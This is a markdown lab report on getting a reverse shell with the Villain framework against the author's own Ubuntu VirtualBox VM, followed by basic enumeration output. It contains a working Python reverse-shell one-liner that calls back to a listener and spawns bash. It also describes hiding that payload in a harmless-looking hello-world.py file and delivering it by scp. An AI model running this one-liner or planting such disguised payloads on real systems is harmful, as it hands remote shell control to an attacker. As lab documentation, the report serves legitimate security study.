# Villain Framework Reverse Shell Report

## ⚙️ Setup Info
- **Payload:** `linux/reverse_tcp/python3 lhost=192.168.50.139`
- **LHOST:** 192.168.50.139
- **LPORT:** 4443
- **Target OS:** Linux (Zwi-VirtualBox)
- **Target User:** zwi
- **Active Shell Session:** 993b09-113ed4-14ec79

## 🔁 Payload Delivery Method
Reverse shell executed directly on the target VM using:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.50.139",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
- Additionally, the payload was embedded in a seemingly harmless file (hello-world.py) and sent to the target via scp as well as over the internet.

- Villain framework recognized the session as 993b09-113ed4-14ec79.

- Session established at 2025-08-14 14:49:13.

## 🖥️ Captured Info

- Hostname: Zwi-VirtualBox
- IP Address: 192.168.50.14
- Logged-in User: zwi
- OS Type: Linux

## 🔎 Enumeration and Proof of Access

- uname -a  //Discovering system information
    - Linux Zwi-VirtualBox 6.11.0-24-generic #24-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 14 18:13:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

- cat /etc/os-release //os details

```
    PRETTY_NAME="Ubuntu 24.10"
    NAME="Ubuntu"
    VERSION_ID="24.10"
    VERSION="24.10 (Oracular Oriole)"
    VERSION_CODENAME=oracular
    ID=ubuntu
    ID_LIKE=debian
    HOME_URL="https://www.ubuntu.com/"
    SUPPORT_URL="https://help.ubuntu.com/"
    BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
    PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
    UBUNTU_CODENAME=oracular
    LOGO=ubuntu-logo
```
- whoami
    - zwi

## Screenshots
![Screenshot-1](<screenshots/Screenshot 2025-08-15 010438.png>)

![Screenshot-2](<screenshots/Screenshot 2025-08-15 010520.png>)

![Screenshot-3](<screenshots/Screenshot 2025-08-15 010815.png>)

Displaying message in target VM
![Screenshot-4](<screenshots/Screenshot 2025-08-15 003219.png>)

#### Note: Detailed screenshots are provided in the screenshots folder.